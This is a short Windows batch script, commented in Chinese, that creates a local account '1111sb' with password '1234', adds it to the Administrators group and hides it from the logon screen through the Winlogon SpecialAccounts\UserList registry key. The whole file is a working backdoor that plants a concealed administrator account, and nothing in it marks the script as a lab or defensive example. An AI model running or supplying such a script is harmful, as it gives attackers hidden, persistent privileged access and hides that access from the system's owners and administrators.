@echo off
setlocal

:: 设置用户名和密码
set "username=1111sb"
set "password=1234"

:: 创建管理员账户
net user %username% %password% /add
net localgroup Administrators %username% /add

:: 隐藏账户（修改注册表）
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v %username% /t REG_DWORD /d 0 /f

:: 隐藏脚本运行窗口
>nul 2>&1

:: 结束脚本
exit /b
